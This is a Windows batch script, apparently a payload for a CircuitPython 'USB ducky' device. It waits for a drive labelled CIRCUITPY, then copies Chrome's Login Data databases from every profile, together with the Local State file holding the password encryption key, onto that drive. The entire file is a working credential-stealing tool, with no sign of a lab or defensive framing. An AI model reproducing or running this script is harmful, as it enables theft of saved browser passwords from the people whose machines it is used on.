@echo off
setlocal enabledelayedexpansion

REM find the drive letter of the CIRCUITPY drive
:while1
for %%d in (A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z) do (
    for /f "tokens=6 delims= " %%i in ('Vol %%d:') do (
        if "%%i" EQU "CIRCUITPY" (  set "CIRCUITPYdrive=%%d:"  )
    )
)
    if Exist %CIRCUITPYdrive% (
        goto :break
)
timeout /t 30
goto :while1
:break
set rand=%RANDOM%

REM create the pass folder
mkdir %CIRCUITPYdrive%\pass


REM copy all the databases to the usb ducky
set "source_dir=%LOCALAPPDATA%\Google\Chrome\User Data\"
set "count=0"

for /D %%G in ("%source_dir%Profile*") do (
    if exist "%%G\Login Data" (
        copy "%%G\Login Data" "%CIRCUITPYdrive%\pass\LoginData!count!.%rand%"
        echo Copied Login Data from %%G
        set /a count+=1
    )
)

copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" "%CIRCUITPYdrive%\pass\LoginData.%rand%" ;
copy "%LOCALAPPDATA%\Google\Chrome\User Data\Local State" "%CIRCUITPYdrive%\pass\LocalState.%rand%" ;

echo ************************************************************
echo All operations completed.
echo ************************************************************


